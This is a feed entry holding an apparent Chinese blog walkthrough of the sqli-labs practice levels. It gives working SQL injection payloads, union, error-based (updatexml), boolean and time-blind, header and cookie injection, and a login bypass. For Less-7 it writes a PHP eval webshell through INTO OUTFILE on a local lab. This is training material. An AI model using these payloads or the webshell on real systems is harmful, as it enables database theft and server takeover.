    <content type="html"><![CDATA[<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><pre><code>判断是否存在注入:?id=1' and 1=1 --+判断字段数:?id=1' order by 3--+判断显错位:?id=-1' union select 1,2,3--+判断库名:?id=-1' union select 1,database(),3--+判断表名:?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema='security'--+?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema='security' limit 3,1--+?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+//可能会因为显示位不全，显示错误判断列名:?id=-1' union select 1,column_name,3 from information_schema.columns where table_schema='security' and table_name='emails'--+?id=-1' union select 1,column_name,3 from information_schema.columns where table_schema='security' and table_name='users'--+判断数据:?id=-1' union select 1,id,3 from emails--+</code></pre><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><p>类第一关</p><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><p>(‘1’)</p><pre><code>判断是否存在注入:?id=1') and 1=1 --+下面类第一关</code></pre><h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><pre><code>$id = '"' . $id . '"';$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";</code></pre><pre><code>判断是否存在注入:?id=1") and 1=1 --+下面类第一关</code></pre><h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><p>盲注&amp;报错注入</p><pre><code>$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";$result=mysql_query($sql);$row = mysql_fetch_array($result);    if($row)    {      echo '&lt;font size="5" color="#FFFF00"&gt;';      echo 'You are in...........';      echo "&lt;br&gt;";        echo "&lt;/font&gt;";      }    else     {        echo '&lt;font size="3" color="#FFFF00"&gt;';    print_r(mysql_error());    echo "&lt;/br&gt;&lt;/font&gt;";    echo '&lt;font color= "#0000ff" font size= 3&gt;';        }}    else { echo "Please input the ID as parameter with numeric value";}</code></pre><pre><code>判断是否存在注入:?id=1' and 1=1 --+判断字段数:?id=1' order by 3--+判断显错位:盲注没有显错位判断库名:?id=1' and updatexml(1,concat(0x7e,(SELECT database()),0x72),1)--+判断表名:?id=1' and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema='security'limit 0,1),0x7e),1)--+判断列名:?id=1' and updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),0x7e),1)--+判断数据:?id=1' and updatexml(1,concat(0x7e,(SELECT id from users limit 0,1),0x7e),1)--+</code></pre><pre><code>updatexml() 更新xml文档的函数语法：updatexml(目标xml内容，xml文档路径，更新的内容)updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)实际上这里是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了但是报错的时候他其实已经执行了那个子查询代码！[0x7e实际是是16进制，Mysql支持16进制，但是开头得写0x 0x7e是一个特殊符号，然后不符合路径规则报错]~ ~添加一个不符合规则的符号进行报错，从而爆出子查询的内容：SELECT database()updatexml ()这个函数一般是配合and或者是or使用的，他和联合查询不同，不需要在意什么字段数eg:select *from news where id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)但是要注意，and情况下只要一个为False，就会判定是False,所以如果and前面的条件不成立的情况下，就不会执行之后的语句。所以使用的时候建议使用or某些没有回显盲注也可以用这个updatexml()做出来。但是报错一般有长度限制，不能输出太长的数据，尽量不要使用group_concat()。</code></pre><pre><code>SELECT * FROM users union select updatexml(1,concat(0x7e,(SELECT database()),0x7e),1);1105 - XPATH syntax error: '~security~'</code></pre><h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><pre><code>判断是否存在注入:?id=1" and 1=1 --+其他类题5</code></pre><h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><pre><code>outfile 向服务器写入文件在利用sql注入漏洞后期，最常用的就是通过mysql的file系列函数来进行读取敏感文件或者写入webshell，其中比较常用的函数有以下三个：写into dumpfile()//保留格式into outfile()//原始数据读load_file()union select 1,'&lt;?php eval($_REQUEST[8])?&gt;' into outfile 'c:/phpstudy/www/1.php'这些都是需要设置secure_file_priv=，如果他为空则可以指定任意目录，如果有设置等于某个路径就只能在这个指定路径下，而他为null时则禁止导入导出功能</code></pre><pre><code>判断字段数:?id=1')) order by 3 --+写马:?id=1')) union select 1,"&lt;?php eval($_REQUEST[1])?&gt;",3 into outfile "D:/AppData/phpstudy_pro/WWW/sqli-labs-master/Less-7/shell.php" --+访问一句话木马http://127.0.0.1:8090/Less-7/shell.php?1=phpinfo();</code></pre><h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><p>盲注</p><pre><code>布尔型盲注:length()函数 返回字符串长度substr() 截取字符串 (语法：SUBSTR(str,pos,len);)ascii() 返回字符的ascii码 [将字符变为数字wei]时间型盲注:sleep()将程序挂起一段时间 n为n秒if(expr1,expr2,expr3)判断语句 如果第一个语句正确就执行第二个语句，如果错误执行第三个语句</code></pre><pre><code>拆解库名长度?id=1' and (length(database()))=8 --+利用ASCII码猜解当前数据库名称：?id=1' and (ascii(substr(database(),1,1)))=115 --+返回正常，说明数据库名称第一位是s?id=1' and (ascii(substr(database(),2,1)))=101 --+返回正常，说明数据库名称第二位是e猜表名:?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101 --+如果返回正常，说明数据库表名的第一个的第一位是e猜字段名:?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='emails' limit 0,1),1,1)))=105 --+如果返回正常，说明emails表中的列名称第一位是i</code></pre><h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h1><p>同样按照盲注的手法，尝试后发现这里无论输入什么条件，回显的结果都是一个，这就证明不能再用刚刚布尔盲注的做法了，要尝试使用时间盲注</p><p>布尔盲注页面会有两种状态</p><p>时间盲注无论条件是什么都只返回一种页面</p><pre><code>猜解库名长度:?id=1' and if(length(database())=8,sleep(5),1) --+利用ASCII码猜解当前数据库名称:?id=1' and if((ascii(substr(database(),1,1))=115),sleep(5),1) --+延时，说明数据库名称第一位是s猜表名:?id=1' and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101),sleep(5),1) --+延时，说明数据库表名的第一个的第一位是e猜字段名:?id=1' and if((ascii(substr((select column_name from information_schema.columns where table_name='emails' limit 0,1),1,1))=105),sleep(5),1) --+如果返回正常，说明emails表中的列名称第一位是i</code></pre><h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h1><pre><code>闭合方式有区别?id=1" and if(length(database())=8,sleep(5),1) --+其他类题九</code></pre><h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h1><p>POST传参</p><pre><code>$uname=$_POST['uname'];$passwd=$_POST['passwd'];@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";</code></pre><pre><code>万能密码:' or 1=1 -- + //要有空格' or 1=1#判断字段数:' or 1=1 order by 2 -- +判断显错位:' union select 1,2#判断库名:' union select 1,database()#判断表名:?id=10' union select 1,table_name from information_schema.tables where table_schema='security'#判断列名:?id=10' union select 1,column_name from information_schema.columns where table_schema='security' and table_name ='users' limit 1,1#判断数据:?id=10' union select 1,username from users#</code></pre><h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h1><pre><code>闭合有区别，尝试万能密码") or 1=1#其他类题十一</code></pre><h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h1><p>post传参的报错注入</p><pre><code>判断是否存在注入:?id=1' and 1=1 -- qwe判断库名:')and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- qwe判断表名：')and updatexml(1,concat(0x7e,(select table_name frominformation_schema.tables where table_schema='security'limit 0,1),0x7e),1)-- qwe判断列名：')and updatexml(1,concat(0x7e,(select column_name frominformation_schema.columns where table_schema='security' and table_name='emails' limit 0,1),0x7e),1)-- qwe判断数据：')and updatexml(1,concat(0x7e,(select id from emails limit 0,1),0x7e),1)-- qwe类题五</code></pre><h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h1><pre><code>类题13判断库名："and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- qwe</code></pre><h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h1><p>POST盲注</p><pre><code>if(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])){    $uname=$_POST['uname'];    $passwd=$_POST['passwd'];    //logging the connection parameters to a file for analysis.    $fp=fopen('result.txt','a');    fwrite($fp,'User Name:'.$uname);    fwrite($fp,'Password:'.$passwd."\n");    fclose($fp);    // connectivity     @$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";    $result=mysql_query($sql);    $row = mysql_fetch_array($result);    if($row)    {          //echo '&lt;font color= "#0000ff"&gt;';                    echo "&lt;br&gt;";        echo '&lt;font color= "#FFFF00" font size = 4&gt;';        //echo " You Have successfully logged in\n\n " ;        echo '&lt;font size="3" color="#0000ff"&gt;';        echo "&lt;br&gt;";        //echo 'Your Login name:'. $row['username'];        echo "&lt;br&gt;";        //echo 'Your Password:' .$row['password'];        echo "&lt;br&gt;";        echo "&lt;/font&gt;";        echo "&lt;br&gt;";        echo "&lt;br&gt;";        echo '&lt;img src="../images/flag.jpg"  /&gt;';                  echo "&lt;/font&gt;";      }    else      {        echo '&lt;font color= "#0000ff" font size="3"&gt;';        //echo "Try again looser";        //print_r(mysql_error());        echo "&lt;/br&gt;";        echo "&lt;/br&gt;";        echo "&lt;/br&gt;";        echo '&lt;img src="../images/slap.jpg"   /&gt;';        echo "&lt;/font&gt;";      }}</code></pre><pre><code>猜解库名长度:' or (length(database()))=8 #利用ASCII码猜解当前数据库名称:' or (ascii(substr(database(),1,1)))=115#返回正常，说明数据库名称第一位是s' or (ascii(substr(database(),2,1)))=101#返回正常，说明数据库名称第二位是e猜表名:' or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101#如果返回正常，说明数据库表名的第一个的第一位是e猜字段名:'or (ascii(substr((select column_name from information_schema.columns where table_name='emails' limit 0,1),1,1)))=105#如果返回正常，说明emails表中的列名称第一位是i</code></pre><h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h1><pre><code>$uname='"'.$uname.'"';$passwd='"'.$passwd.'"'; @$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";</code></pre><pre><code>类题15闭合区别") or (length(database()))=8 #</code></pre><h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h1><p>密码重置，所以从下面的password入手，使用报错注入</p><pre><code>判断是否存在注入:' or 1=1 -- +判断库名:' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+判断表名:' and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema='security'limit 0,1),0x7e),1)--+判断列名:' and updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),0x7e),1)--+判断数据:' and updatexml(1,concat(0x7e,(SELECT id from users limit 0,1),0x7e),1)--+</code></pre><h1 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h1><p>进入网站就显示了ip，网页记录了ip、浏览器信息以及其他信息就可能是头注入</p><pre><code>请求头User-Agent浏览器的身份标识字符串Referer表示浏览器所访问的前一个页面，可以认为是之前访问页面的链接将浏览器带到了当前页面。Accept可接受的响应内容类型（Content-Types）。X-Forwarded-For可以用来表示HTTP请求端真实IPDate发送该消息的日期和时间（以RFC 7231中定义的"HTTP日期"格式来发 送）</code></pre><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220926021922107.png" alt="image-20220926021922107"></p><pre><code>$insert = "INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";注入点为uagent即User-Agent</code></pre><p>必须要登录成功才会记录IP，弱口令</p><pre><code>uname=admin&amp;passwd=admin</code></pre><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220926225009930.png" alt="image-20220926225009930"></p><pre><code>判断库名:'and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1),1,1)-- #$insert = "INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (''and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1),1,1)-- #', '$IP', $uname)";后面的1,1)为了补齐后面'$IP', $uname两个字段判断表名:'and updatexml(1,concat(0x7e,(select table_name frominformation_schema.tables where table_schema='security'limit 0,1),0x7e),1),1,1)-- #判断列名:'and updatexml(1,concat(0x7e,(select column_name frominformation_schema.columns where table_schema='security' and table_name='emails' limit 0,1),0x7e),1),1,1)-- qwe判断数据:'and updatexml(1,concat(0x7e,(select id from emails limit 0,1),0x7e),1),1,1)-- qwe</code></pre><h1 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h1><pre><code>注入点与18不同，其他类18注入点变为referer</code></pre><pre><code>$insert="INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')";</code></pre><h1 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h1><p>登录之后会显示很多个人信息，特别是提示cookie</p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220926230310574.png" alt="image-20220926230310574"></p><p>诸如点是cookie</p><pre><code>$sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";</code></pre><pre><code>判断库名:'and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- qwe判断表名:'and updatexml(1,concat(0x7e,(select table_name frominformation_schema.tables where table_schema='security'limit 0,1),0x7e),1)-- qwe判断列名:'and updatexml(1,concat(0x7e,(select column_name frominformation_schema.columns where table_schema='security' and table_name='emails' limit 0,1),0x7e),1)-- qwe判断数据:'and updatexml(1,concat(0x7e,(select id from emails limit 0,1),0x7e),1)-- qwe</code></pre><h1 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h1><p>Cookie被base64编码，把payload用base64编码再发包</p><p><img src="https://raw.githubusercontent.com/Yum1Yum1/images/master/blogImg/image-20220926234909554.png" alt="image-20220926234909554"></p><pre><code>判断库名:admin 'and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) and '1'='1YWRtaW4gJ2FuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoU0VMRUNUIGRhdGFiYXNlKCkpLDB4N2UpLDEpIGFuZCAnMSc9JzE=判断表名:admin 'and updatexml(1,concat(0x7e,(select table_name frominformation_schema.tables where table_schema='security'limit 0,1),0x7e),1) and '1'='1判断列名:'and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),0x7e),1) and '1'='1判断数据:and updatexml(1,concat(0x7e,(select id from emails limit 0,1),0x7e),1)and '1'='1</code></pre><h1 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h1><p>Less-23</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Less-1&quot;&gt;&lt;a href=&quot;#Less-1&quot; class=&quot;headerlink&quot; title=&quot;Less-1&quot;&gt;&lt;/a&gt;Less-1&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;判断是否存在注入:
?id=1&#39; and 1=1 --+

判断字段数:
?id=1&#39; or</summary>
      
    
    
    
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
